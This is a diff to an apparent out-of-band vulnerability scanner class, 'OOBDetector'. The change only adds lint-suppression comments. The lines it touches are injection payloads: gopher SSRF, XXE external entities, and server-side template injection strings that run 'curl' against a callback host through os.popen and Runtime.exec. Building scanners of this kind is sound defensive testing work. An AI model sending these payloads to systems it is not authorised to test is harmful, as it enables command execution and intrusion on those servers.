@@ -214,8 +214,8 @@ class OOBDetector:
             "gopher://{callback}:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20{callback}",
         ],
         "xxe": [
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback}">]><foo>&xxe;</foo>',
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback}">%xxe;]>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback}">]><foo>&xxe;</foo>',  # noqa: E501
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback}">%xxe;]>',  # noqa: E501
             '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback}/xxe">]>',
         ],
         "sqli": [
@@ -231,7 +231,7 @@ class OOBDetector:
         ],
         "ssti": [
             "${{T(java.lang.Runtime).getRuntime().exec('curl http://{callback}')}}",
-            "{{config.__class__.__init__.__globals__['os'].popen('curl http://{callback}').read()}}",
+            "{{config.__class__.__init__.__globals__['os'].popen('curl http://{callback}').read()}}",  # noqa: E501
         ],
     }
 
